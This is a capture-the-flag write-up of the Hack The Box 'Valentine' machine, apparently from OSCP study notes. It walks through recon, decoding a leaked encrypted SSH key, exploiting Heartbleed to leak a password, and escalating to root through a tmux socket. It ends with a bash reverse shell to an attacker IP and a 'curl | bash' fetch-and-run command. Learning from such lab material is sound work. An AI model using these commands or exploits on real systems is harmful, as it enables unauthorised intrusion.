---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/linux-boxes/valentine-easy
---

# ✅ Valentine (Easy)

## Lesson Learn

![](../../../../../../.gitbook/assets/Valentine.PNG)

## Report-Penetration

**Vulnerable Exploit:** Memory Disclosure

**System Vulnerable:** 10.10.10.79

**Vulnerability Explanation:** The machine is vulnerable to memory disclosure on HTTPS service running with openssl which could leak password in base64.

**Privilege Escalation Vulnerability:** Misconfigure of file permission

**Vulnerability Fix:** Update the version of application and Restrict permission

**Severity:** High

**Step to Compromise the Host:**&#x20;

## Reconnaissance

```
└─$ nmap -p- -sC -sV -T4 10.10.10.79   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 08:33 EST
Nmap scan report for 10.10.10.79
Host is up (0.042s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-11-08T13:34:18+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Port 80 Apache/2.2.22

I will go through on Port 80 first. It just display a simple webpage.

![](<../../../../../../.gitbook/assets/image (812).png>)

Let start gobuster to discover hidden directory.

```
└─$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/08 08:37:19 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]                              
/decode               (Status: 200) [Size: 552]                              
/omg                  (Status: 200) [Size: 153356]                           
/server-status        (Status: 403) [Size: 292]                              
                                                                             
===============================================================
2021/11/08 08:40:45 Finished
===============================================================
```

Going through /dev we found hype\_key and notes.txt.

![](<../../../../../../.gitbook/assets/image (263).png>)

On **hype\_key**, it seem like hex values and notes mention fixing decoder/encoder before live.

![](<../../../../../../.gitbook/assets/image (349).png>)

![](<../../../../../../.gitbook/assets/image (721).png>)

By converting those Hex value into text, it's RSA key.

```
└─$ wget http://10.10.10.79/dev/hype_key                                                                                 

└─$ xxd --help     
    -ps         output in postscript plain hexdump style.
    -r          reverse operation: convert (or patch) hexdump into binary.

└─$ cat hype_key | xxd -r -ps
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----   
```

By saving that private key on the machine and try to connect ssh but it requires the password.

```
└─$ ssh -i id_rsa hype@10.10.10.79        
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
hype@10.10.10.79's password: 
```

### Port 443 Apache/2.2.22

By going through the port 443, it just displays the same page. Let start scan for vulnerable.

```
└─$ nmap --script vuln 10.10.10.79  
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
```

```
└─$ sslyze --heartbleed 10.10.10.79

 CHECKING HOST(S) AVAILABILITY
 -----------------------------
 
   10.10.10.79:443                       => 10.10.10.79 
   
 SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79
 ----------------------------------------------
 * OpenSSL Heartbleed:
                                          VULNERABLE - Server is vulnerable to Heartbleed

 SCAN COMPLETED IN 0.49 S
 ------------------------
```

## Exploitation

We found the application on port 443 is vulnerable to Heartbleed. Search for public exploit code.

![](<../../../../../../.gitbook/assets/image (412).png>)

Proof of concept code: [Heartbleed](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py)

We can run python exploit code against the machine. Once, we run this script, the output will be different each because of memory leak. After sometimes, we found leak base64 encode.

```
└─$ python heartbleed.py 10.10.10.79
defribulator v1.16 A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
################################################################## 
Connecting to: 10.10.10.79:443, 1 times 
Sending Client Hello for TLSv1.0 
Received Server Hello for TLSv1.0
WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable! Please wait... connection attempt 1 of 1 ##################################################################
.@....SC[...r....+..H...9... 
....w.3....f... 
...!.9.8.........5............... 
.........3.2.....E.D...../...A.................................I......... 
........... 
...................................#.......0.0.1/decode.php 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==V.]..l(......X
```

We can use the application to decode this and login with the password found.

![](<../../../../../../.gitbook/assets/image (290).png>)

![](<../../../../../../.gitbook/assets/image (403).png>)

## Privilege Escalation

### #1 Priv-Esc (Tmux)

```
hype@Valentine:~$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess 
   10  tmux a -t dev_sess 
   11  tmux --help
   12  tmux -S /.devs/dev_sess 
   13  exit
   14  whoami
   15  id
```

By checking on history, seem like the system running tmux in the process. Enumerating on the process tmux, we found under root permission.

```
hype@Valentine:~$ ps aux | grep tmux
root       1005  0.0  0.1  26416  1672 ?        Ss   05:31   0:03 /usr/bin/tmux -S /.devs/dev_sess
hype       3550  0.0  0.0  13576   920 pts/0    S+   08:01   0:00 grep --color=auto tmux
```

Let start following the history command.

```
# we can get the normal user session
hype@Valentine:/.devs$ tmux -L dev_sess
[exited]

# No sessions
hype@Valentine:/.devs$ tmux a -t dev_sess
no sessions

```

```
# Correct path and pop up with root shell
hype@Valentine:/.devs$ tmux -S /.devs/dev_sess
```

![](<../../../../../../.gitbook/assets/image (268).png>)

Creating a bash reverse shell script and start HTTP Server as well as netcat on port 4444.

```
└─$ cat rev.sh                                                                            1 ⨯
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.31/4444 0>&1'
```

On victim machine just get the file and execute the bash script.

```
root@Valentine:~# curl 10.10.14.31/rev.sh | bash
```

![](<../../../../../../.gitbook/assets/image (792).png>)



